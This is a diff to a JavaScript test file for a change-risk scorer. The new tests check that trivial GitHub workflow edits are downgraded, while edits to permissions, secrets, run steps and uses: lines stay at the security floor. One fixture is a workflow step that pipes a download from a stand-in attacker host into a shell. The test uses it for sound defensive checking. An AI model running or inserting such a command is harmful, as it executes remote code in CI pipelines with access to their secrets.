@@ -141,8 +141,82 @@ describe("computeScore — security floor never beaten by mechanical", () => {
     const r = scoreOf([d("lib/licensing.js", "M", "+// note", 2)]);
     expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
   });
-  it("comment-only .github/workflows stays high", () => {
+  it("comment-only .github/workflows is NOT risk-bearing → downgraded to high, not pinned to the security floor (BUI-381)", () => {
     const r = scoreOf([d(".github/workflows/quality.yml", "M", "+# note", 1)]);
+    expect(r.riskScore).toBeLessThan(DEFAULTS.base.securityFloor);
+    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.high);
+  });
+  it("a permissions/secrets/run change to .github/workflows stays pinned to the security floor (BUI-381)", () => {
+    const permissions = scoreOf([
+      d(
+        ".github/workflows/ci.yml",
+        "M",
+        "+permissions:\n+  contents: write",
+        2,
+      ),
+    ]);
+    expect(permissions.riskScore).toBeGreaterThanOrEqual(
+      DEFAULTS.base.securityFloor,
+    );
+    const secrets = scoreOf([
+      d(
+        ".github/workflows/ci.yml",
+        "M",
+        "+  token: ${{ secrets.DEPLOY_KEY }}",
+        1,
+      ),
+    ]);
+    expect(secrets.riskScore).toBeGreaterThanOrEqual(
+      DEFAULTS.base.securityFloor,
+    );
+    const run = scoreOf([
+      d(
+        ".github/workflows/ci.yml",
+        "M",
+        "+      run: curl attacker.example | sh",
+        1,
+      ),
+    ]);
+    expect(run.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
+    const newAction = scoreOf([
+      d(".github/workflows/ci.yml", "A", "+      uses: some/new-action@v1", 1),
+    ]);
+    expect(newAction.riskScore).toBeGreaterThanOrEqual(
+      DEFAULTS.base.securityFloor,
+    );
+  });
+  it("version-pin-only bump to .github/workflows (uses: line changed but only the ref) still stays at the security floor — uses: lines are always risk-bearing by design", () => {
+    // Conservative-by-design: any `uses:` line touch is treated as
+    // risk-bearing (see WORKFLOW_RISK_PATTERNS), including a pure version
+    // bump, because distinguishing "just a version pin" from "swapped to a
+    // different action" from diff text alone is not reliably safe. Real
+    // trivial workflow edits (comments, job names, `on:` triggers) are what
+    // downgrade — see the case above.
+    const r = scoreOf([
+      d(
+        ".github/workflows/ci.yml",
+        "M",
+        "-      uses: actions/checkout@v4\n+      uses: actions/checkout@v5",
+        2,
+      ),
+    ]);
+    expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
+  });
+  it("job-name/on:-trigger-only edit to .github/workflows downgrades (BUI-381)", () => {
+    const r = scoreOf([
+      d(
+        ".github/workflows/ci.yml",
+        "M",
+        "-name: CI\n+name: Continuous Integration\n-on:\n-  push:\n+on:\n+  push:\n+    branches: [main]",
+        4,
+      ),
+    ]);
+    expect(r.riskScore).toBeLessThan(DEFAULTS.base.securityFloor);
+  });
+  it("a non-workflow security-floor file (e.g. auth/) is an unconditional path pin regardless of diff content (BUI-381 does not weaken this)", () => {
+    const r = scoreOf([
+      d("src/auth/session.js", "M", "+// harmless comment", 1),
+    ]);
     expect(r.riskScore).toBeGreaterThanOrEqual(DEFAULTS.base.securityFloor);
   });
   it.each([
